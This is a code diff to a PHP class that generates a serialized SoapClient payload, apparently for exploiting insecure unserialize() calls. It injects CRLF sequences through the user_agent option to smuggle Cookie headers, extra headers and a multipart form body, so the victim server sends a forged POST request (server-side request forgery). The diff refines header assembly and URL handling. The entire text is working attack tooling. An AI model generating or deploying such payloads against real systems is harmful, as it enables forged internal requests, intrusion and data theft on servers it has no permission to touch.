@@ -14,6 +14,8 @@ class get_form_data_soap{
 		
 		$cookie = array();
 		$headers = array();
+		$tags = array();
+		
 		foreach($config['cookies'] as $key => $value){
 			array_push($cookie,$key.'='.$value);
 		}
@@ -32,17 +34,22 @@ class get_form_data_soap{
 			$data.=join("\x0d\x0a",array($fuzz,"Content-Disposition: form-data; name=\x22{$key}\x22; filename=\x22{$value['filename']}\x22","Content-Type: {$value['type']}",'',$value['content'],''));
 		}
 		$data.=$fuzz.'--';
+		
 		$content_type = 'Content-Type: multipart/form-data; boundary='.substr($fuzz,2);
 		$content_length = 'Content-Length: '.strlen($data);
-		$contents = join("\x0d\x0a",array($config['ua'],'Cookie: '.join(';',$cookie),join("\x0d\x0a",$headers),$content_type,$content_length))."\x0d\x0a\x0d\x0a".$data;
+		
+		if(!empty($cookie)) array_push($tags,"Cookie:".join(';',$cookie));
+		if(!empty($headers)) array_push($tags,join("\x0d\x0a",$headers));
+		array_push($tags,$content_type,$content_length);
+		array_unshift($tags,$config['ua']);
+		
+		$contents = join("\x0d\x0a",$tags)."\x0d\x0a\x0d\x0a".$data;
 		
 		$soap = new SoapClient(null, array(
-			'location' => $config['url'].'?'.$params,
+			'location' => $config['url'].($params?'?'.$params:''),
 			'user_agent' => $contents,
 			'uri' => '2333'
 		));
-		
-		#echo str_replace("\x0a",'<br>',$contents);
 
 		return serialize($soap);
 	}
